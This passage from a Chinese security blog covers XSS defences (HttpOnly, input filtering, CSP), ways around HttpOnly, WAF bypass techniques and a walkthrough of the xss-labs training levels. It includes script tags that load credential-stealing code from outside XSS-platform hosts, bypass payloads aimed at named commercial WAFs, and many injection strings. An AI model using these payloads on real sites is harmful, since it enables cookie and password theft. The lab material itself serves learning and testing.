+<p><a target="_blank" rel="noopener" href="https://www.oschina.net/question/100267_65116">https://www.oschina.net/question/100267_65116</a></p>
+<p>如果您在cookie中设置了HttpOnly属性，那么 <strong>通过js脚本将无法读取到cookie信息（唯一的作用）</strong>，这样能有效的防止XSS攻击，但是并不能防止xss漏洞，只能是防止cookie被盗取。</p>
+<p>一般除了开启 httponly，还会同时将用户所提供的内容输入输出进行过滤，许多语言都有提供对HTML的过滤。</p>
+<ul>
+<li><p>对于PHP而言：<a target="_blank" rel="noopener" href="https://www.zuimoge.com/212.html">https://www.zuimoge.com/212.html</a></p>
+<p>可以在php.ini文件内修改<code>session.cookie_httponly=True</code>，可以在网页php代码中开启<code>ini_set(&quot;session.cookie_httponly&quot;, 1)</code>，还可以在输入输出进行关键字、大小写、特殊符号过滤等等。比如PHP的htmlentities()和htmlspecialchars()这两个函数可以把字符转换为 HTML 实体，使得攻击代码失效。ASP的Server.HTMLEncode()对一段指定的字符串应用 HTML 编码。</p>
+</li>
+<li><p>对于Java而言（ESAPI）：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p>
+<p>ESAPI是一个Apache开发的安全组件，首先应当配置过滤器（注意在过滤器中chain.doFilter(..)方法中的Request对象进行包装，在包装类中对请求参数进行筛选操作）。其次将过滤器注册到web.xml文件中；最后配置Request的包装类，在其中对请求信息进行过滤。</p>
+<p>可以选择使用CSF(Content Security Policy)安全策略：CSF是一种白名单防御策略，所有不在名单内的资源都不被信任，有效的防止了通过外部的标签、脚本、JS文件等资源的入侵形式。</p>
+</li>
+</ul>
+</li>
+<li><p>WAF</p>
+</li>
+</ul>
+<h2 id="HttpOnly的绕过"><a href="#HttpOnly的绕过" class="headerlink" title="HttpOnly的绕过"></a>HttpOnly的绕过</h2><ul>
+<li><p>若浏览器未保存帐号密码</p>
+<p>利用表单劫持，得到用户输入的账号密码，并抄送到XSS平台上去，再应用到XSS攻击中。</p>
+<p>前提条件1：明文密码；前提条件2：XSS存在于登录框才行，比较鸡肋</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104453015.png" alt="image-20220801104453015"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104215899.png" alt="image-20220801104215899"></p>
+</li>
+<li><p>若浏览器保存帐号密码</p>
+<p>浏览器读取帐号密码。根据表单配置XSS平台，然后写入XSS代码。</p>
+<p>确定注册时的表单属性信息：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104757064.png" alt="image-20220801104757064"></p>
+<p>在XSS平台创建一个项目，点击配置，选择获取浏览器保存的账号密码：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104653286.png" alt="image-20220801104653286"></p>
+<p>按照网站的表单信息填写相应的属性：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104836681.png" alt="image-20220801104836681"></p>
+<p>配置完成后，按照XSS平台提供的攻击语句在浏览器执行攻击，比如<code>&lt;sCRiPt sRC=//xsshs.cn/9TUt&gt;&lt;/sCrIpT&gt;</code>。</p>
+</li>
+</ul>
+<h2 id="常规WAF绕过思路"><a href="#常规WAF绕过思路" class="headerlink" title="常规WAF绕过思路"></a>常规WAF绕过思路</h2><p>常见WAF过滤的标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  &lt;a&gt;  &lt;p&gt;  &lt;img&gt;  &lt;body&gt; &lt;button&gt;  &lt;var&gt;  &lt;div&gt;  &lt;iframe&gt;  &lt;object&gt; &lt;input&gt; </span><br><span class="line">&lt;textarea&gt;  &lt;keygen&gt; &lt;frameset&gt;  &lt;embed&gt;  &lt;svg&gt;  &lt;math&gt;  &lt;video&gt;  &lt;audio&gt; &lt;select&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="黑名单（大小写绕过）"><a href="#黑名单（大小写绕过）" class="headerlink" title="黑名单（大小写绕过）"></a>黑名单（大小写绕过）</h3><p>过滤单引号、双引号、&lt;、&gt;、on开头的单词等非法字符。</p>
+<p>比如过滤script，但是没有考虑大小写：</p>
+<p><code>&lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p>
+<h3 id="删除黑名单字段（重复数据绕过）"><a href="#删除黑名单字段（重复数据绕过）" class="headerlink" title="删除黑名单字段（重复数据绕过）"></a>删除黑名单字段（重复数据绕过）</h3><p>尝试在 <code>&lt;script&gt;</code> 中再嵌套一个 <code>&lt;script&gt;</code>绕过：</p>
+<p><code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p>
+<h3 id="特殊符号干扰"><a href="#特殊符号干扰" class="headerlink" title="特殊符号干扰"></a>特殊符号干扰</h3><ul>
+<li><p>引号闭合参数，不要&gt;</p>
+<p>如果对&lt;&gt;进行了过滤，无法使用，可以用引号闭合链接（对于来自XSS平台的含有XSS的恶意链接）。</p>
+<p>比如<code>&lt;script src=&#39;https://xxs8.cc/xxxx&#39;</code>是有可能成功攻击的。</p>
+</li>
+<li><p><code>/</code>干扰</p>
+<p><code>&lt;/img src=&quot;#&quot; onerror=&quot;javascript:alert(1)&quot;sbjkdsbfjeb#&gt;</code></p>
+</li>
+</ul>
+<h3 id="标签语法替换"><a href="#标签语法替换" class="headerlink" title="标签语法替换"></a>标签语法替换</h3><p>使用代码 <code>$name = preg_replace( &#39;/&lt;(.\*)s(.\*)c(.\*)r(.\*)i(.\*)p(.\*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code>，<code>.</code>代表任意字符，<code>*</code>代表匹配前一个字符0或无限次。其中<code>preg_replace</code> 函数可以调用正则表达式，进行 script 的逐字检查，并通过 <code>/i</code> 来不区分大小写。</p>
+<p>但是上述代码只考虑了script标签的XSS，其实 <strong>JS 脚本不仅仅可以在 <code>&lt;script&gt;</code> 标签中使用，通过 <code>&lt;img&gt;</code> 标签中 <code>onerror</code> 行为也可以调用 JS 脚本。</strong></p>
+<p>提交 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，攻击成功。</p>
+<p>也可尝试更多其他标签，比如<code>&lt;a&gt;</code>、<code>&lt;svg&gt;</code>、<code>&lt;audio&gt;</code>等。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728162118390.png" alt="image-20220728162118390"></p>
+<h3 id="字符长度限制绕过"><a href="#字符长度限制绕过" class="headerlink" title="字符长度限制绕过"></a>字符长度限制绕过</h3><p>如果只是在浏览器前端进行的字符长度限制，那么要么禁用或者修改前端的相关JS脚本，要么绕过前端在 Burpsuite 中修改数据包就可以轻松绕过限制。</p>
+<h3 id="提交方式更改"><a href="#提交方式更改" class="headerlink" title="提交方式更改"></a>提交方式更改</h3><p>get不行，换post。</p>
+<p>比如安全狗的部分拦截仅针对URL（get）进行检测。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220731151918996.png" alt="image-20220731151918996"></p>
+<p>更换为post提交后payload成功执行：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220731152045595.png" alt="image-20220731152045595"></p>
+<p>有时也可以选择 HTTP 头部进行注入：</p>
+<p>Referer表示本网页的上一个URL，这里的攻击语句首先使用引号闭合语法，然后定义type为text，使得alert(1)能够显示。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801092502124.png" alt="image-20220801092502124"></p>
+<p>攻击成功，网页上出现弹框：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801092649962.png" alt="image-20220801092649962"></p>
+<h3 id="垃圾数据溢出"><a href="#垃圾数据溢出" class="headerlink" title="垃圾数据溢出"></a>垃圾数据溢出</h3><p>在脚本末尾加上大量无关字符，导致过滤条件失效。注意最后要加上#注释、或者&#x2F;&#x2F;、或者–+，需要自己试（特殊符号干扰）。</p>
+<p>比如<code>&lt;script src=&#39;https://xxs8.cc/xxxx&#39;fhdhbgdioslbdvs#&gt;</code></p>
+<h3 id="编码转换（编码绕过）"><a href="#编码转换（编码绕过）" class="headerlink" title="编码转换（编码绕过）"></a>编码转换（编码绕过）</h3><p>对输入到页面的数据进行编码转换，使得攻击语句的某些特殊字符被编码，攻击失效。</p>
+<p>绕过时，对攻击语句也主动进行编码即可，网站发现这些字符已经被编码，会自动对某些编码进行解码。。</p>
+<p>包括JS编码，HTML实体编码，URL编码。</p>
+<ul>
+<li><p>JS编码</p>
+<p>JS提供了四种编码策略：</p>
+<p>三个八进制数字，如果个数不够，在前面补0，比如”e”的编码为”\145”；</p>
+<p>两个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\x65”；</p>
+<p>四个十六进制数字，如果个数不够，在前面补0，比如”e”的编码为”\u005”；</p>
+<p>对于一些控制字符，使用特殊的C类型的转义风格。</p>
+</li>
+<li><p>HTML实体编码</p>
+<p>命名实体：以&amp;开头，以分号结尾，例如<code>&lt;</code>的编码是<code>&amp;lt;</code>。</p>
+<p>字符编码：十进制、十六进制ASCII码或Unicode字符编码，样式为<code>&amp;#数值;</code>，例如<code>&lt;</code>的编码是<code>&amp;#060;</code>和<code>&amp;#x3c;</code>。</p>
+</li>
+<li><p>URL编码</p>
+<p>由于网页会对URL进行一次解码，所以使用URL编码绕过时有时需要进行两次编码。所以在使用编码测试时，需要考虑HTML的渲染顺序，选择合适的编码方式进行测试。</p>
+</li>
+</ul>
+<p>针对不同的WAF产品，有不同的编码绕过方法：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-250852.htm">https://bbs.pediy.com/thread-250852.htm</a></p>
+<p>针对Cloudflare，使用无空格filler绕过：<code>&lt;a&quot;/onclick=(confirm)()&gt;click\</code></p>
+<p>针对Worldfence，使用数字符编码绕过：<code>&lt;a/href=javascript&amp;colon;alert()&gt;click\</code></p>
+<p>针对Barracuda，使用数字符编码绕过：<code>&lt;a/href=&amp;#74;ava%0a%ed%09script&amp;colon;alert()&gt;click\</code></p>
+<p>针对Akamai，使用黑名单中缺少的event handler;混淆函数调用：<code>&lt;d3v/onauxclick-[2]. some(conf irm)&gt;click\</code></p>
+<h3 id="内置函数转义（难绕过）"><a href="#内置函数转义（难绕过）" class="headerlink" title="内置函数转义（难绕过）"></a>内置函数转义（难绕过）</h3><p>使用 <code>htmlspecialchars</code> 函数对提交的信息进行 <strong>转义</strong>。该函数会将所有特殊字符转义为 HTML 实体。比如把 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，把 <code>&gt;</code> 转义为 <code>&amp;gt;</code>。只要正确的使用该函数，XSS 攻击就可以彻底杜绝。</p>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p><a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p>
+<p>xss-labs通关大合集：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wo41ge/article/details/107459332%E3%80%81">https://blog.csdn.net/wo41ge/article/details/107459332、</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/123592092">https://blog.csdn.net/m0_62879498/article/details/123592092</a></p>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>所输入name的值会回显在<code>&lt;h2&gt;&lt;/h2&gt;</code>中，因此直接插入script：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述语句是标准模板，后面的关卡均可以先输入上述内容，来判断所使用的防御手段。</p>
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>中的内容被实体编码了，但在Input中没有：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;ccb&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因此在value中插入script，但是注意<code>&quot;&gt;</code>闭合以及注释。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>在<code>&lt;h2&gt;&lt;/h2&gt;</code>以及<code>&lt;input&gt;</code>中的内容均被实体编码，无法使用&lt;&gt;。</p>
+<p>因此，使用<code>&lt;input&gt;</code>的特殊事件来触发script，input的&lt;&gt;可以不闭合。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&#x27; onfocus=javascript:alert(1)//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line">&lt;input name=keyword  value=&#x27;&#x27; onfocus=javascript:alert(1)//&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入后，再点击输入框即可出发onfocus事件。</p>
+<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>第三关的单引号闭合换为双引号。</p>
+<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>经过尝试，发现script、onfocus、οnmοuseοver 均被注释掉了。使用<code>&lt;a&gt;</code>标签。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>经过尝试，发现script和href均被过滤。使用大小写绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">// 使用效果如下，页面会增加一个显示为ccb的超链接，点击即可触发js代码</span><br><span class="line">&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a Href=javascript:alert(1)&gt;ccb&lt;/a&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p><code>&lt;input&gt;</code>的value值未被实体编码，但是若提交的内容中有script、href会被替换为空。双写绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;ccb&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>引号、&lt;、&gt;均被实体编码，href、script又被过滤，只能使用编码绕过。</p>
+<p>将<code>javascript:alert(1)</code>中的script转化为实体编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><p>在第8关的基础上，强制输入的内容要带有<code>http://</code>，不然报错。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(`http://`)</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>页面上没有输入框，检查源码发现有三个<code>&lt;input&gt;</code>，尝试输入发现只有t_sort会回显。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=ccb</span><br><span class="line"></span><br><span class="line">?keyword=1&amp;t_sort=&quot; type=&quot;&quot; onclick= alert(`xss`)&gt;//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_sort&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>= <span class="string">alert(</span>`<span class="attr">xss</span>`)&gt;</span>//&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入后，再点击页面即可触发onclick事件。</p>
+<h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>与第10关的区别是双引号、&lt;&gt;被实体编码了。</p>
+<p>但是可以看到多了一个名为t_ref的input标签，该标签的值也无法通过get方法赋予。但是根据名称，猜测来自referer。抓包，修改referer，发现响应体中的t_ref确实与请求头的referer字段的值相同。</p>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20230917213236492.png" alt="image-20230917213236492" style="zoom:50%;" />
+
+<p>使用BP或者hackbar提交referer即可。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">referer:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br><span class="line"></span><br><span class="line">// 效果如下</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;t_ref&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>//&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20230917215234200.png" alt="image-20230917215234200"></p>
+<h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>与第11关原理相同，只不过回显的字段从Referer换成了User-Agent。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent:&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>与第11关原理相同，只不过回显的字段从Referer换成了Cookie。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;&quot; onclick=alert(&#x27;xss&#x27;)&gt;//</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40929683/article/details/120422266">https://blog.csdn.net/qq_40929683/article/details/120422266</a></p>
+<h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>传入src参数的值会被用于<code>ng-include</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?src=ccb</span><br><span class="line"></span><br><span class="line">// 查看页面html</span><br><span class="line">&lt;span class=&quot;ng-include:ccb&quot;&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>ng-include</code>指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。</p>
+<blockquote>
+<p>ng-include如果单纯指定地址，必须要加引号</p>
+<p>ng-include加载外部html，script标签中的内容不执行</p>
+<p>ng-include加载外部html中含有style标签样式可以识别</p>
+<p>ng-include 属性的值可以是一个表达式，返回一个文件名</p>
+<p>默认情况下，包含的文件需要包含在同一个域名下。</p>
+</blockquote>
+<p>尝试通用的攻击语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&quot;&lt;script&gt;alert(1)&lt;/script&gt;  // </span><br></pre></td></tr></table></figure>
+
+<p>发现双引号被过滤，&lt;&gt;被实体编码，只能使用其他XSS语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 加载同一域名下的外部文件level1.php，同时传入参数name</span><br><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这样该页面就会包含level1.php，并传入name参数<code>&lt;img src=1 onerror=alert(1)&gt;&#39;</code>，由于在解析src时出错，所以触发onerror。</p>
+<h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>尝试如下语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?keyword=&lt;img src=1 οnerrοr=alert(&#x27;xss&#x27;) &gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现script被注释，空格和&#x2F;均被转义。</p>
+<p>尝试使用%0A替换空格：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level-17-20"><a href="#level-17-20" class="headerlink" title="level 17-20"></a>level 17-20</h3><p>flash XSS，与swf文件相关。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40929683/article/details/120422266">https://blog.csdn.net/qq_40929683/article/details/120422266</a></p>
+</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">ccb</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS/undefined">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS/undefined')">XSS</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"><div class="post-reward" onclick="anzhiyu.addRewardMask()"><div class="reward-button button--animated" title="赞赏作者"><i class="anzhiyufont anzhiyu-icon-hand-heart-fill"></i>打赏作者</div><div class="reward-main"><div class="reward-all"><span class="reward-title">感谢你赐予我前进的力量</span><ul class="reward-group"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul><a class="reward-main-btn" href="/about/#about-reward" target="_blank"><div class="reward-text">赞赏者名单</div><div class="reward-dec">因为你们的支持让我意识到写文章的价值🙏</div></a></div></div></div><div id="quit-box" onclick="anzhiyu.removeRewardMask()" style="display: none"></div></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://frankcao3.github.io/posts/[object%20Object]/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4.%20XSS/undefined"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a 